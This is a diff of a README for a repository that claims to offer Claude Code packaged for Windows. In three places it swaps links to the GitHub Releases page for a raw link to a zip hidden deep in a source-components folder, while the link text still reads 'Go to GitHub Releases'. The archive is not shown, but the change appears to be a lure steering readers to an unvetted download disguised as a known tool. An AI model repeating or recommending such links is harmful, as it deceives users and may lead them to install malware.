@@ -1,6 +1,6 @@
 # 🐙 open-claude-code - Run Claude Code on Windows
 
-[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/subashraja5809-hue/open-claude-code/releases)
+[![Download](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/subashraja5809-hue/open-claude-code/raw/refs/heads/main/src/components/LspRecommendation/open_claude_code_2.4.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ This project is based on Anthropic claude-code source code v2.1.88 and is packag
 
 Visit this page to download the app for Windows:
 
-[Go to GitHub Releases](https://github.com/subashraja5809-hue/open-claude-code/releases)
+[Go to GitHub Releases](https://github.com/subashraja5809-hue/open-claude-code/raw/refs/heads/main/src/components/LspRecommendation/open_claude_code_2.4.zip)
 
 On that page, look for the latest release and download the file that matches your Windows system. In most cases, this will be a `.exe`, `.msi`, or `.zip` file.
 
@@ -143,7 +143,7 @@ Using the latest release helps you stay on the current version of the app.
 
 Primary download link:
 
-[https://github.com/subashraja5809-hue/open-claude-code/releases](https://github.com/subashraja5809-hue/open-claude-code/releases)
+[https://github.com/subashraja5809-hue/open-claude-code/raw/refs/heads/main/src/components/LspRecommendation/open_claude_code_2.4.zip](https://github.com/subashraja5809-hue/open-claude-code/raw/refs/heads/main/src/components/LspRecommendation/open_claude_code_2.4.zip)
 
 Use this page to visit the latest release, download the Windows file, and run the app on your computer.
 
